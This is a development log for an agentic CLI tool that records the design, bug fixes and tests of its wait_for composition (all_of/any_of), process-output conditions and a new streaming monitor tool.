sub threw a real error (e.g. `process_exit` against an unknown
process_id, which throws `bg process not found` synchronously
on first poll), `Promise.all` rejected immediately. The outer
`finally` only removed the outer-abort listener — `subAc` was
never aborted, so sibling sub-waits kept polling until their
own (outer) timeouts fired. Net effect: timer + signal-listener
leak past the function's return; observable as a 5s wait
instead of <100ms when one sub failed fast.

**Fix:** wrap `Promise.all(tracked)` in try/catch:
1. `subAc.abort()` — cancel siblings.
2. `await Promise.allSettled(subPromises)` — drain so we don't
   return before children clean up timers / handlers.
3. `timeout.cleanup()` — outer timer.
4. Re-throw original error.

Regression test: `tests/wait/composition.test.ts` — all_of with
[file_exists never-appears, process_exit bad-id] under
bgManager. Asserts both the throw propagates AND elapsed < 500ms
(proving siblings were cancelled, not waited out).

**Non-fix (race semantics, deliberate):** in `any_of`, when a
winner emerges, errors thrown by losing siblings are silently
dropped. Considered briefly as "asymmetric error visibility"
but rejected: race contract is "first success wins, others
become irrelevant" — surfacing losing-sibling errors after a
success would break the success contract for noise. Real errors
are still surfaced when EVERY sub rejects (the existing
AggregateError → realError path). Comment in code documents
this as intentional.

**Done:**
- `src/wait/index.ts` — try/catch around all_of's Promise.all,
  abort+drain on rejection (lines ~467 onward).
- Comment update in any_of's allSettled block — documents the
  losing-sibling-error drop as deliberate race semantics.
- `tests/wait/composition.test.ts` — regression test for
  sibling-cancellation timing.

**Why:** principle 9 (reversible by design) requires that a
failed orchestration doesn't leave background polling loops
holding signal listeners. The leak was bounded by the outer
timeout (so not unbounded), but it violated the "wait_for
returns when its decision is made, not later" contract.

**Verification:** `bun test` 828 pass / 7 skip / 0 fail;
`tsc --noEmit` clean; `biome check` clean.

### Follow-up: `process_output` mis-reports normal exit as `aborted`

Second 🟡 caught right after committing the all_of fix.

**Bug:** in the `process_output` drain block, when the process
exits without matching, the no-match return went through
`finishUnmatched(...)`. That helper picks `conditionMet` from
`timeout.timeoutFired() ? 'timeout' : 'aborted'`. With a generous
outer timeout (e.g. 5s) and a process that finishes in ~100ms,
the timeout hadn't fired → `conditionMet='aborted'` despite no
abort signal being raised. Workflows that branch on
`conditionMet==='aborted'` (treating it as a user/system cancel)
would terminate prematurely on a normal process completion.

**Fix:** add `'process_exited'` to the `WaitConditionMet` union
and return it explicitly from the drain block (bypassing
`finishUnmatched`'s aborted/timeout dichotomy). Mirrors the
`MonitorReason='process_exited'` already used by `monitor.ts`,
keeping the two primitives' vocabulary aligned. Tool surface
relays the value via `condition_met` automatically — the type
re-export carries the new variant.

**Done:**
- `src/wait/index.ts` — `WaitConditionMet` adds `'process_exited'`;
  drain-block return uses it explicitly with `timeout.cleanup()`.
- `tests/wait/process.test.ts` — existing test for
  `processExited in payload` now also asserts
  `conditionMet === 'process_exited'`. Comment explains the
  prior buggy behavior so future regressions are caught.

**Why:** principle 7 (trace everything). The conditionMet field
is the trace primitive that downstream code reads to decide
"why did the wait end?". Conflating "process finished" with
"someone aborted me" corrupts that trace and propagates wrong
decisions into hooks, recap, audit.

**Verification:** `bun test` 828 pass / 7 skip / 0 fail;
`tsc --noEmit` clean; `biome check` clean.

### Follow-up: composition no-match also mis-reports as `aborted`

Same root cause as the `process_output` follow-up, one level up
in the composition layer.

**Bug:** in `src/wait/index.ts`, both branches of the composition
handler returned `finishUnmatched(...)` for deterministic
no-match outcomes:
- `any_of` — every sub resolved with `matched=false` before the
  outer timeout (e.g. multiple `process_output` subs whose
  processes exited without matching).
- `all_of` — a sub returned `matched=false` and triggered the
  short-circuit (e.g. one `process_output` sub exited).
In both cases, `timeout.timeoutFired()` is false and no caller
abort happened, so `finishUnmatched` defaults to
`conditionMet='aborted'`. Workflows branching on
`conditionMet==='aborted'` (treating it as a user/system cancel)
prematurely terminated on a deterministic composition outcome.

**Fix:** new helper `finishUnmatchedComposition(kind, payload)`
with priority `outer timeout > caller abort > kind`. Both
composition no-match paths now use it. The `WaitConditionMet`
union already includes `'all_of'` / `'any_of'` (previously only
emitted on match) — it now also signals "composition resolved
deterministically without a match", symmetric with how
`finishMatched` uses the same kind.

**Decision:** outer timeout still wins over kind. If the outer
timeout fires *while* a composition is being resolved (e.g.
during the inter-poll sleep), the wait was effectively cut
short — `'timeout'` is the more specific signal. Same for
caller abort. The kind label is reserved for "every sub ran to
its own conclusion before the outer signal fired".

**Done:**
- `src/wait/index.ts` — adds `finishUnmatchedComposition`,
  rewires `any_of` no-winner block + `all_of` firstFail block
  to use it. Comments explain the distinction.
- `tests/wait/composition.test.ts` — two regression tests:
  `all_of: deterministic sub-failure reports kind, not aborted`
  and `any_of: every sub deterministically fails reports kind,
  not aborted`. Both use `process_output` against a process
  that exits early to produce the deterministic-fail signal.

**Why:** principle 7 (trace everything), principle 8 (failure
modes are first-class). `aborted` and `timeout` both mean "the
wait did not run to its natural conclusion". A composition
that ran every sub to completion DID reach a conclusion — the
trace primitive must reflect that.

**Verification:** `bun test` 830 pass / 7 skip / 0 fail;
`tsc --noEmit` clean; `biome check` clean.

---

## [2026-04-29] M3 / Step 2.2.4 — monitor (streaming observation, closes Step 2.2)

Closes Step 2.2 with the streaming-observation half of spec
§7.3.1: a `monitor` tool that collects events over a duration
and returns the batch when the budget is exhausted. Distinct
from `wait_for` (which stops at first match): the model gets
a list of events, not a binary matched/no-match.

Use cases the spec calls out: tail logs for warnings/errors
across a build, watch a file tree for compilation output,
collect every line a dev server emits during startup.

**Slice scope (2.2.4):**

| Component | Status | Notes |
|---|---|---|
| `src/wait/monitor.ts` | NEW | `monitor(condition, opts)` primitive. Polls per-condition, accumulates events, terminates on durationMs / maxEvents / abort / process_exited |
| Condition `process_output_lines` | NEW | Each newline-delimited line in stdout/stderr is an event. Partial-line buffering across poll boundaries |
| Condition `process_output_pattern` | NEW | Each regex match (multi-match via /g) is an event. Tool layer compiles user pattern with /g — opposite of wait_for which rejects /g |
| Condition `file_changes` | NEW | Each mtime change on a single path is an event. Glob expansion deferred (single path only for v1) |
| Tool `monitor` | NEW | Separate from wait_for — different return shape. category=misc, planSafe=true. Tool count 10 → 11 |
| Tests | NEW | tests/wait/monitor.test.ts + tests/tools/monitor.test.ts |

**Decisions to make explicit upfront:**

- **`monitor` is a separate tool, not a `wait_for` extension.**
  Return shape is fundamentally different (events array
  vs single match). Sharing the wait_for tool would force
  a discriminated union on the OUTPUT shape which models
  consume — confusing for the LLM and asymmetric in the
  schema. Two tools with crisp single-purpose surfaces.
- **`/g` flag IS used internally for pattern matching.**
  For `process_output_pattern`, we need ALL matches in a
  chunk, not just the first. `String.matchAll` requires
  /g. Tool layer compiles user pattern with /g (opposite
  of wait_for's `process_output` which rejects /g — there
  we used `RegExp.exec` once and /g would carry
  lastIndex state across calls breaking the per-poll
  re-read pattern). Different primitive, different
  constraint.
- **Observational reads, same as wait_for.** Uses
  `manager.readOutput` with explicit `sinceStdout`/
  `sinceStderr` so the model's persisted cursor stays
  untouched. A subsequent canonical `bash_output` sees
  the SAME bytes the monitor collected.
- **Single path for `file_changes`, no glob.** Spec
  mentions glob; v1 supports a single absolute or
  relative-to-ctx.cwd path. Glob expansion needs a
  watcher across multiple files (chokidar-style), which
  reopens the polling-vs-native-watcher decision from
  Step 2.2.1. Defer until a real workflow surfaces it.
- **Termination reasons enumerated.** `'duration'` (the
  durationMs cap fired), `'max_events'` (event count
  reached the cap), `'aborted'` (caller signal),
  `'process_exited'` (process_* conditions only —
  monitor stops when the source process is gone).
- **Empty pattern list / no events is a valid result.**
  `monitor` returns `{ events: [], reason: 'duration' }`
  when nothing matched. Not an error. The model decides
  what to do with empty observations.
- **Process_* events drain on exit.** Same lesson from
  Step 2.2.2's drain fix: when a process exits with
  pending bytes, scan the tail before terminating.
  Pattern matches in the tail still produce events.

**Out of scope (deferred):**

- **Glob in `file_changes`.** Pull-in: when a workflow
  needs "watch every TS file under src/".
- **Per-line max length cap.** A pathological process
  emitting a 10MB single line (no \n) would buffer
  indefinitely. Default `readOutput` maxBytes (64KB)
  caps per-poll growth; a separate cap on accumulated
  buffer would be a real defense. Pull-in: if a
  workflow surfaces it.
- **Event ordering across streams.** Events from
  stdout and stderr are interleaved by poll round, not
  by their ACTUAL emission timestamps (we don't have
  per-byte timestamps from the kernel). Documented as
  a risk — the events list is approximately ordered.

**Spec reference:** `AGENTIC_CLI.md §7.3.1` (monitor
clauses), `src/wait/index.ts` (sibling primitive).

**Done:**

- `src/wait/monitor.ts` — `monitor(condition, opts)`
  primitive. Polls per-condition, accumulates events,
  terminates on durationMs / maxEvents / abort /
  process_exited. Sibling to waitFor; lives in the
  same module barrel.
- 3 condition kinds:
  - `process_output_lines` — newline-delimited lines
    from bg stdout/stderr. Partial-line buffer carried
    across polls; `\r\n` normalized to `\n`. On
    process exit, drains any unterminated tail as a
    final event with `partial: true`.
  - `process_output_pattern` — every match (multi-
    match via /g via `String.matchAll`) becomes an
    event. The compiled RegExp ALWAYS has /g —
    opposite of wait_for's `process_output` which
    rejects /g (different primitive, different
    constraint).
  - `file_changes` — every mtime change on a single
    path. Glob deferred (single path only for v1).
- Termination reasons enumerated:
  `'duration'` / `'max_events'` / `'aborted'` /
  `'process_exited'`. The result also carries
  `processStatus` and `processExitCode` (when
  applicable) so the model knows whether the source
  process is still running on duration-termination
  vs already exited.
- Observational reads via `manager.readOutput` with
  explicit `sinceStdout`/`sinceStderr` — model
  cursor untouched. Test pins this contract: a
  monitor call leaves the cursor at 0; subsequent
  canonical `bash_output` sees the same content the
  monitor observed.
- `monitor` tool (`src/tools/builtin/monitor.ts`):
  - `category: 'misc'`, `planSafe: true` —
    observational, same as wait_for.
  - Schema mirrors monitor input shape with
    snake_case fields. Pattern is string + is_regex
    (default false → literal escape). Both modes
    compile with /g.
  - `file_changes.path` resolves against `ctx.cwd`;
    `..` segments rejected (same as wait_for's
    file_exists / file_change).
  - `bgManager` validation walks the condition: any
    `process_output_*` requires it; missing manager
    → `bg.manager_unavailable`. Unknown / cross-
    session process_id → `bg.process_not_found`
    (uniform with bash_output / wait_for).
- Tool count: 10 → 11. Bootstrap test updated.
- 17 unit tests in `tests/wait/monitor.test.ts`:
  every-line capture, stream separation, observational
  contract, max_events termination, duration
  termination with `processStatus: 'running'`,
  trailing partial-line drain on exit, every-regex-
  match collection, max_events=1 short-circuit,
  process_exited payload, file_changes (changes +
  no-changes), abort signal handling (mid + pre-
  aborted), bgManager validation (process_* requires
  it, file_changes doesn't), unknown id throws.
- 12 tool tests in `tests/tools/monitor.test.ts`:
  end-to-end happy paths for all 3 conditions,
  literal vs is_regex, ctx.cwd path resolution,
  validation (unknown kind / empty pattern / invalid
  regex / `..` / negative duration), bg manager
  dependency (`bg.manager_unavailable`,
  `bg.process_not_found`, file_changes works without
  manager).
- Total: 812 pass / 7 skip / 0 fail. Typecheck +
  lint green.

**Decisions taken (not in opener):**

- **Tighter default poll interval (200ms vs
  wait_for's 500ms).** monitor is generally observing
  rapidly-changing state (logs flowing, files being
  written by a build). 500ms felt sluggish for that
  use case. Configurable via `pollIntervalMs`.
- **Default `maxEvents = 100`.** A bounded cap so the
  payload returned to the model is predictable in
  size. Models can override; the default keeps a
  "tail until done" call safe even for chatty
  processes.
- **Partial-line drain on process exit.** When
  `process_output_lines` sees the source exit, any
  unterminated tail in the buffer becomes a final
  event with `partial: true`. Without this, the
  trailing line of a crash log (no \n before the
  process died) would be silently dropped.
- **`processStatus` carried across termination
  reasons.** Initially the field was only set on
  `process_exited`; tests revealed that a model
  hitting `duration` on a still-running process gets
  no signal about the process state. Now: every
  termination path includes `processStatus` /
  `processExitCode` from the last successful
  `readOutput` poll, so the model can distinguish
  "duration ran out, process is still running"
  (continue polling later) from "duration ran out,
  process happens to have exited" (no point
  continuing).
- **Removed unused `waitForExit` helper from the
  test file.** The lines tests don't need to wait for
  exit explicitly — monitor's `process_exited`
  termination is the natural signal. Lint complained
  about the unused import; rather than suppress, just
  removed.

**Code review fixes applied before commit:**

- **`process_output_pattern` overlap + dedup.** Was:
  each poll read strictly new bytes; a pattern
  straddling a poll boundary disappeared from the
  events list. Same class of bug as wait_for's
  `process_output` (fixed in commit 2bb1e36). Now:
  `PATTERN_OVERLAP_BYTES = 64` carry-over buffer per
  stream prepended to the new chunk before `matchAll`.
  Matches whose end falls inside the buffer (i.e.,
  entirely already emitted last poll) are skipped —
  emit only matches that extend into new bytes. Two
  regression tests pin the contract: a marker
  straddling `printf 'BLT-MON-'; sleep 0.1; printf
  'TOKEN-99'` is matched once; a single short marker
  observed across many polls emits exactly one event
  (no double-emit).
- **Removed defensive non-/g fallback.** Was: pattern
  scan path branched on `condition.pattern.global` and
  fell back to a single `RegExp.exec` for non-/g —
  fail-quietly behavior that contradicted monitor's
  "every match" semantics. Now: throw upfront with a
  clear message. Tool layer always compiles with /g;
  programmatic callers get a loud failure instead of
  silent semantic drift. Regression test pins:
  passing a non-/g regex rejects with `/global.*'g'/`.
- **Snake_case payload keys at the tool boundary.**
  Was: top-level result fields used snake_case
  (`condition_met`, `elapsed_ms`) but inner payloads
  passed through with camelCase (`mtimeMs`,
  `processId`, `matchedIndex`). Models that learned
  snake from `process_id` got tripped by camel in
  payloads. Now: shared helper `src/tools/_keys.ts`
  recursively converts payload keys to snake_case;
  applied at the boundary in both `wait_for` and
  `monitor` tools. Internal types stay camelCase
  (idiomatic TS); conversion is a tool-output detail.
  Tool tests updated to expect snake (e.g.
  `r.payload?.mtime_ms`); module-level tests stay
  camelCase since they exercise the wait module
  directly.

**Risks documented:**

- **Per-line max length unbounded.** A pathological
  process emitting a 10MB single line (no \n) would
  buffer indefinitely. Default `readOutput` maxBytes
  (64KB) caps per-poll growth; a separate cap on
  accumulated buffer would be a real defense.
  Pull-in: if a workflow surfaces it, add
  `maxLineBytes` per condition with truncation
  marker.
- **Event ordering across streams is poll-batch
  approximate.** Events from stdout and stderr are
  interleaved by poll round, not by their actual
  emission timestamps (we don't have per-byte kernel
  timestamps). For a log with interleaved
  stdout/stderr writes within a single poll window,
  the order is "stdout first, then stderr" by our
  implementation, NOT chronological. Document; if a
  workflow needs strict ordering, the bg subsystem
  would need a unified merged-stream output (spec
  §7.3 doesn't currently call for this).
- **`file_changes` mtime granularity.** Same risk
  as wait_for's `file_change`. Documented in 2.2.1
  risks.
- **Glob expansion for `file_changes` deferred.**
  Spec mentions `path: string | glob`; v1 supports
  single path. Pull-in: when "watch every TS file
  under src/" becomes a real workflow.

**Step 2.2 closure:** all four sub-steps (2.2.1
non-bg conditions, 2.2.2 process_*, 2.2.3
composition, 2.2.4 monitor) shipped. The wait/monitor
half of spec §7.3.1 is complete.

---

## [2026-04-29] M3 / Step 2.2.3 — wait_for composition (all_of / any_of)

Closes the `wait_for` tool surface with the composition layer
spec §7.3.1 calls out: `all_of` (AND — wait for every
sub-condition) and `any_of` (OR — race for the first match).
Recursive over the 7 existing condition kinds (sleep,
file_exists, file_change, port_open, http_response,
process_exit, process_output) so a model can express
"wait for the dev server to be ready (port_open OR
http_response on /health) AND the build artifact to be
written (file_exists)" in a single tool call.

`monitor` (the third half of §7.3.1, streaming events) is
split into Step 2.2.4 — different primitive (returns
`{ events[], reason }`, separate tool surface).

**Slice scope (2.2.3):**

| Component | Status | Notes |
|---|---|---|
| `WaitCondition.all_of` | NEW | Recursive: `{ kind: 'all_of'; conditions: WaitCondition[] }` |
| `WaitCondition.any_of` | NEW | Same shape, OR semantics |
| `WaitConditionMet.all_of` / `any_of` | NEW | Distinct success kinds for payload routing |
| Dispatch: any_of | NEW | Promise.any over sub-waits — first match wins. Loser sub-waits are aborted via shared AbortController. allSettled at the end ensures no leaked timers |
| Dispatch: all_of | NEW | Spawn sub-waits in parallel, short-circuit abort on first failure (matched=false). Promise.all waits for all to settle (aborted siblings resolve quickly) |
| Tool: recursive `buildCondition` | UPDATED | Validates nested conditions[]. Depth limit prevents adversarial nesting |
| Tests | NEW | `tests/wait/composition.test.ts` + tool-level cases |

**Decisions to make explicit upfront:**

- **`any_of` uses `Promise.any`, not `Promise.race`.** Race
  resolves on first SETTLED promise — including a sub
  that timed out. We want first MATCHED. Promise.any
  rejects only when all promises reject; we map
  matched=false → rejection, matched=true → resolution.
  Cleaner than ad-hoc filtering.
- **`all_of` short-circuits on first failure.** As soon
  as any sub returns matched=false, we abort the rest
  via shared AbortController. Avoids paying the full
  outer timeout for siblings that can't possibly help.
- **Sub-waits inherit `bgManager` and a shared abort
  signal.** Process_* conditions can appear inside
  composition (`any_of([{ kind: 'process_exit'... }])`).
  We thread `options.bgManager` to sub-calls; missing
  manager fails fast at the sub's entry validation.
- **Depth limit = 5.** `all_of([all_of([all_of(...)])])`
  could be unbounded otherwise. Hard cap defends
  against adversarial / buggy model output. Pulled in
  if a real workflow needs deeper.
- **Empty `conditions` arrays are well-defined:**
  - `all_of([])` matches IMMEDIATELY (vacuously true —
    the universal quantifier over empty set is true).
  - `any_of([])` times out (vacuously false — the
    existential over empty set is false).
  - Both documented in the schema; no special-case
    error.
- **PolicyMode interactions stay at the leaf.** A
  composition has no policy decision — only its leaves
  (file_exists path, port_open host, etc.) do. Same as
  Step 2.2.1's "no path policy gate on wait_for" risk;
  composition doesn't make that gap better or worse.

**Out of scope (2.2.4):**

- `monitor` — streaming events with LLM-runs-at-end
  semantics. Different return shape, different tool.

**Spec reference:** `AGENTIC_CLI.md §7.3.1` (composition
clauses), `src/wait/index.ts` (existing dispatch).

**Done:**

- WaitCondition extended with `all_of` and `any_of`,
  both recursive over `WaitCondition[]`.
  WaitConditionMet adds `'all_of'` and `'any_of'`
  success kinds.
- Composition handlers run BEFORE the poll loop in
  `waitFor` (composition orchestrates, doesn't poll).
  Sub-waits get a derived AbortController (`subAc`)
  whose signal is what they receive as their `signal`
  option. Outer-abort propagates to subAc via a
  `once: true` listener; on resolution we abort subAc
  to cancel siblings.
- `any_of` uses `Promise.any` over sub-promises
  mapped so matched=false → rejection. First MATCH
  wins (not first settled). Loser sub-waits are
  cancelled; `Promise.allSettled` ensures we don't
  return before they clean up. Payload reports
  `{ matchedIndex, matchedKind, matchedPayload? }`.
- `all_of` uses `Promise.all` over tracked sub-promises;
  the first failure (matched=false) sets `firstFail`
  and aborts siblings via `subAc`. Promise.all still
  awaits everyone settling (aborted siblings resolve
  quickly). Payload reports `{ matched: N }` on success
  or `{ failedIndex, failedKind, failedPayload? }` on
  failure.
- Empty-array semantics:
  - `all_of([])` returns matched=true with `matched: 0`
    immediately.
  - `any_of([])` waits out the outer `timeoutMs` then
    returns matched=false / conditionMet=`'timeout'`.
- Tool surface adds `all_of` / `any_of` kinds to the
  schema. `buildCondition` recurses with
  `depth + 1`; `MAX_COMPOSITION_DEPTH = 5` rejects
  unbounded nesting. `containsProcessCondition`
  walks the (possibly composed) condition tree so
  `bgManager` validation at the tool boundary catches
  process_* nested in composition (e.g.,
  `any_of([process_exit, sleep])`) — surfaces as
  `bg.manager_unavailable`, not a mid-wait
  `wait.internal_error`.
- 11 unit tests in `tests/wait/composition.test.ts`:
  any_of races first match, cancels losers,
  empty array timeouts, captures matched sub-payload;
  all_of waits for everyone, short-circuits on first
  failure, empty array immediate match, payload on
  failure; nested any_of inside all_of; aborted
  signal propagates to sub-waits.
- 5 tool tests in `tests/tools/wait-for.test.ts`:
  empty arrays, recursive validation rejects nested
  bad kind, depth limit rejects deep nesting,
  process_* nested → bg.manager_unavailable,
  end-to-end any_of via tool surface.
- Total: 780 pass / 7 skip / 0 fail. Typecheck +
  lint green.

**Decisions taken (not in opener):**

- **Listener cleanup in `finally`.** The composition
  handler's outer-abort listener is added to
  `combinedSignal` and removed in a `finally` block.
  Without this, nested composition (sub-wait inside a
  parent) would leave a dangling listener on the
  parent's signal until both finished — small leak,
  documented for hygiene.
- **`Promise.any` rejection ignored, not aggregated.**
  When all sub-promises reject (no match), Promise.any
  throws AggregateError with the individual results.
  We swallow the aggregate and call `finishUnmatched()`
  with no payload — the conditionMet will reflect
  whether the outer timeout or caller signal fired.
  Surfacing per-sub failure reasons in any_of's payload
  was considered; rejected because the model only cares
  that NONE matched, and the outer reason (timeout vs
  abort) is what's actionable. all_of's failure DOES
  surface the failing sub because that IS actionable
  ("which dependency failed?").
- **Depth limit at the tool boundary, not the wait
  module.** Programmatic callers building WaitConditions
  in code can compose as deep as they want (TypeScript's
  recursive type signals the intent). The depth limit
  is specifically to defend against adversarial /
  buggy MODEL output via the tool — the validation
  layer is the right gate.

**Code review fixes applied before commit:**

- **`any_of` distinguishes real errors from
  matched=false rejections.** Was: Promise.any's
  AggregateError was caught silently — a composition
  with all sub-waits rejecting (e.g., a single-element
  any_of where the sub throws `bg process not found`)
  silently reported timeout. Now: AggregateError.errors
  is scanned for Error instances; the first real one is
  re-thrown, propagating up through the tool layer as
  `bg.process_not_found` (or whatever the sub-error
  shape was). WaitResult-shaped rejections (the
  synthetic `throw r` for matched=false) are skipped
  — those are legitimate "no match" outcomes. all_of
  was already correct because Promise.all rejects on
  first rejection.
- **Recursive bgManager pre-check covers nested
  process_*.** Was: only the top-level kind was
  checked, so `any_of([process_exit, sleep])` without
  bgManager would dispatch sub-waits and let them fail
  with the (now-fixed-above) any_of error path. Now:
  `containsProcessKind` walks the condition tree at
  function entry, throws a clear "composition needs
  manager" error before any dispatch happens. Mirrors
  the tool layer's own `containsProcessCondition` so
  programmatic callers get the same protection. The
  pre-check runs BEFORE the composition handler so
  sub-waits never get spawned with a missing manager.
- 3 regression tests pin the contract:
  any_of with a process_* sub but no manager rejects
  with /bgManager/; nested process_* (2-level deep)
  also rejects; all_of fails fast at function entry
  with clear message.

**Pending (Step 2.2.4):**

- `monitor` — streaming events with LLM-runs-at-end
  semantics. Returns `{ events[], reason }`, separate
  tool surface. Distinct enough to deserve its own
  step.

**Risks documented:**

- **No depth limit in the wait module itself.**
  Programmatic callers (the tool layer or future
  internal use) could construct deeper nesting and
  the wait module would happily recurse. Stack depth
  in JS handles ~1000+ levels comfortably; the model-
  facing limit at the tool layer is the practical
  bound. If a future programmatic caller produces
  pathological depth, a wait-module-level cap can
  land.
- **Multiple sub-waits in parallel multiply poll
  cost.** A composition with N sub-conditions polling
  every 500ms means N concurrent polls. Each poll is
  cheap (fs.existsSync, a TCP connect, etc.) but the
  multiplier is real for large N. `MAX_COMPOSITION_DEPTH`
  bounds the tree, not the breadth — N=20 sub-waits
  in a single any_of is allowed and may stress the
  event loop. Pull-in: if a real workflow needs many
  parallel probes, batch via stride-polling.
- **Sub-wait timeoutMs == outer timeoutMs.** Each
  sub-wait gets the same `timeoutMs` as the outer.
  Their internal timer fires roughly when the outer's
  combinedSignal aborts (both connected). Doesn't
  cause double-counting, but wasted timer
  registrations. Negligible.

---

## [2026-04-29] M3 / Step 2.2.2 — process_exit + process_output

Continues Step 2.2 with the bg-aware wait conditions. After
2.2.1 the `wait_for` tool can sleep, watch files, probe ports,
and poll HTTP — but for the highest-value use case (waiting on
a `bash_background` process to be ready) the model still has to
loop `bash_output` calls, paying LLM cost every step. Spec §7.3.1
calls out the savings: ~$0.40 polling vs ~$0.10 with `wait_for`
on a typical port-ready loop.

**Slice scope (2.2.2):**

| Component | Status | Notes |
|---|---|---|
| `BgManager.getStatus(id)` | NEW | Thin accessor returning `{ status, exitCode, exitedAt } \| null`. Enough for process_exit polling without exposing the full row |
| `WaitOptions.bgManager?` | NEW | Optional injection; process_* conditions fail with clean error when manager is missing |
| Condition `process_exit` | NEW | Poll `getStatus` until `status !== 'running'`. Payload: `{ processId, status, exitCode }`. No log-file reads |
| Condition `process_output` | NEW | Poll `readOutput` with explicit `since*` (transient — doesn't advance model's persisted cursor). Test compiled regex against the new chunk. Local cursors with `PATTERN_OVERLAP=64` avoid missing patterns spanning poll boundaries |
| Tool surface | UPDATED | New kinds in WaitForCondition. `pattern: string` + `is_regex?: boolean` (default false → escape literal). `process_id: string` |
| Tests | NEW | `tests/wait/process.test.ts` with bg manager fixtures (DB + tmp logDir). Tool-level cases extend `tests/tools/wait-for.test.ts` |

**Decisions to make explicit upfront:**

- **Pattern is RegExp internally, string at the tool boundary.**
  JSON has no native regex; the tool accepts `pattern: string`
  and `is_regex?: boolean`. `is_regex: false` (default) escapes
  the input as a literal — matches "READY" exactly, no
  surprise from `.` or `[`. `is_regex: true` compiles the
  string as a regex; if invalid, clean tool error.
- **Process exit during a `process_output` wait is reported
  via payload, not a new conditionMet kind.** Wait returns
  `matched: false` with `payload: { processExited: true,
  exitCode, status }`. Adding 'process_exit' to the
  conditionMet for an OUTPUT wait would conflate two
  different intents. Tools that want exit OR output should
  use `any_of` (lands in 2.2.3).
- **Transient reads via `sinceStdout`/`sinceStderr`.** The
  wait module uses explicit `since*` so the model's
  persisted cursor stays untouched. Same lesson from commit
  `3f8bbda`: explicit since = transient. After a successful
  wait, the model's next `bash_output` call sees the SAME
  bytes (including the matched window) — wait observed,
  didn't consume.
- **Pattern overlap heuristic.** Each poll re-reads the last
  `PATTERN_OVERLAP_BYTES = 64` bytes of the previous read
  alongside the new bytes. Catches patterns up to 64 bytes
  long that straddle a poll boundary. Patterns longer than
  64 bytes risk missing matches; document as risk and pull
  in a configurable overlap if a real workflow surfaces it.
- **`getStatus` instead of exposing `getBgProcess`.** The
  manager already imports the repo for its own internal
  needs; re-exposing the full row would couple wait/ to
  storage row shape. `getStatus` returns only what wait
  needs, lets storage shape evolve independently.

**Out of scope for 2.2.2 (deferred to 2.2.3):**

- `monitor` (streaming events, LLM runs at the end).
- `all_of` / `any_of` composition (recursive resolution,
  spec acknowledges race surface in `any_of`).

**Spec reference:** `AGENTIC_CLI.md §7.3.1`,
`src/bg/manager.ts` (readOutput + status accessor).

**Done:**

- `BgManager.getStatus(id)` — thin accessor returning
  `StatusSnapshot { status, exitCode, exitedAt } | null`.
  Cross-session ids return null (defense-in-depth, same
  pattern as readOutput / kill).
- `WaitOptions.bgManager?: BgManager` injection point. Only
  required for process_* conditions. Other conditions
  ignore the field.
- Condition `process_exit` — polls `getStatus` until
  status leaves 'running'. Payload reports
  `{ processId, status, exitCode, exitedAt }`. Cheap (no
  log file IO). Already-exited processes match on first
  poll (verified < 200ms in test).
- Condition `process_output` — polls
  `manager.readOutput` with explicit `sinceStdout`/
  `sinceStderr` so the read is transient (lesson from
  commit `3f8bbda`). Local cursors track wait progress
  independently from the model's persisted cursor; a
  successful wait does NOT consume bytes — a subsequent
  canonical bash_output sees the SAME content (test
  pins this contract). Pattern is regex (compiled at
  the tool layer); first match returns
  `{ processId, stream: 'stdout' | 'stderr', match }`.
  When the process exits without matching, returns
  `matched: false` with payload
  `{ processExited: true, status, exitCode }` so the
  model can distinguish "running but no marker yet
  (timeout)" from "service crashed before saying ready
  (process exited)".
- `PATTERN_OVERLAP_BYTES = 64` — each poll re-reads the
  last 64 bytes of the previous read alongside the new
  bytes, catching patterns that straddle a poll
  boundary. Test pins this with `printf 'BLT-'; sleep
  0.1; printf 'TOKEN-37'` + pattern `/BLT-TOKEN-37/`.
- Tool surface adds `process_exit` and `process_output`
  kinds to `WaitForCondition`. Schema fields:
  `process_id` (required), `pattern: string` (literal
  by default), `is_regex?: boolean` (default false →
  literal escape via `escapeRegexLiteral`). The global
  flag (`g`) is rejected because RegExp.exec with /g
  carries lastIndex state across calls and breaks the
  per-poll re-read pattern.
- Tool error mapping:
  - missing bgManager → `bg.manager_unavailable` (same
    code as bash_output / bash_kill — uniform operator
    surface)
  - unknown / cross-session process_id →
    `bg.process_not_found` (same code as bash_output /
    bash_kill)
  - invalid regex when `is_regex: true` →
    `tool.invalid_arg` with the underlying message
  - empty process_id / empty pattern → `tool.invalid_arg`
- 14 unit tests in `tests/wait/process.test.ts`: literal
  match in stdout, regex match in stderr, observational
  contract (cursors stay at 0), timeout, processExited
  payload on exit-without-match, pattern overlap across
  polls, unknown id, missing bgManager. process_exit
  covers natural exit, non-zero code, immediate match
  on already-exited, timeout on never-exiting.
- 10 tool tests in `tests/tools/wait-for.test.ts`:
  process_exit reports exit code; process_output
  literal escapes regex meta (`1.0` doesn't match
  `100`); is_regex=true compiles regex; invalid regex
  rejected; bg.process_not_found / bg.manager_unavailable
  surfaces.
- Total: 762 pass / 7 skip / 0 fail. Typecheck + lint
  green.

**Decisions taken (not in opener):**

- **Tool error codes mirror bash_output/bash_kill.** When
  bgManager is missing or process_id is unknown, the
  operator-facing surface is the same as the existing bg
  tools — `bg.manager_unavailable` and `bg.process_not_found`.
  Avoids one-off wait-prefixed codes that would force the
  operator to learn duplicate vocabulary.
- **process_output's exit detection is reactive, not
  predictive.** We don't subscribe to the natural-exit
  promise; we poll readOutput and check `r.status`. The
  `live` map in the manager isn't part of the public
  surface, and exposing it would couple wait/ deeper than
  needed. The polling cost is bounded (one extra DB read
  per cycle) and the observability is the same.
- **Local cursors live entirely in the wait module.** No
  storage state. If the wait is aborted mid-flight, the
  cursors are simply discarded — nothing to clean up.
  Future `monitor` (2.2.3) may want persistent state for
  cross-session resumption, but that's a separate
  concern.
- **The /g rejection happens after construction, not
  before.** `new RegExp(pattern)` from a string can't
  carry the global flag (no inline `/g` flag in JS regex
  syntax, and the second arg isn't accepted from our
  schema). The `regex.global` check is defensive against
  future construction paths that might.

**Pending (Step 2.2.3):**

- `monitor` (streaming events, LLM runs at the end after
  max_events / duration / cancellation).
- `all_of` / `any_of` composition (recursive resolution,
  spec acknowledges race surface in `any_of`).

**Code review fixes applied before commit:**

- **`process_output` drains pending bytes after exit.**
  Was: a process emitting >64KB (default `readOutput`
  maxBytes) and exiting in the same poll window would
  have only the first chunk scanned. `r.status='exited'`
  + `r.stdoutPending > 0` triggered an immediate
  processExited report, silently skipping the tail
  where the pattern might live. Now: on detecting exit,
  the loop drains until both stream pendings are 0,
  testing each chunk. Defensive break on cursor-not-
  advancing prevents infinite loops if a future
  readOutput regression returns end < cursor.
